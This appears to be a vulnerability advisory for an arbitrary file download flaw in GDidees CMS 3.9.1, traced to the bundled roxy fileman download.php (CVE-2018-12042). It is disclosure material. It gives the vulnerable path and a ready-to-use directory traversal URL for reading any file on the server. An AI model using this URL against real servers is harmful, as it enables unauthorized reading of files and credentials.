## [Descrisption]
An any file download vulnerability in the download function of GDidees CMS 3.9.1 allows unauthorized attackers to traverse files and download.

## [Vulnerability Type]

Incorrect Access Control

## [Vendor of Product]

GDidees

## [Affected Product Code Base]

GDidees CMS - 3.9.1 and lower versions

## [Affected Component]

GDidees CMS uses an third-party application (roxy fileman 1.4.6) for their download feature, this download application is vulnerable to CVE-2018-12042.
the vulnerable file is 'download.php' located at {webroot}/_admin/ckeditor/plugins/ckfinder/php

## [Attack Type]

Remote

## [Any file download]

true

## [Attack Vectors]

The attacker can traverse the file and download it. The URL for downloading the file is:
http://{URL-of_GDidees}/_admin/ckeditor/plugins/ckfinder/php/download.php?f=/userfiles/uploadfiles/stat/../../../../../../../{filename}


## [PoC]

1.Creating Test Files on C Disk
![](img/1.jpg#center)

2.Attempting to download files
![](img/2.jpg#center)

![](img/3.jpg#center)

![](img/4.jpg#center)
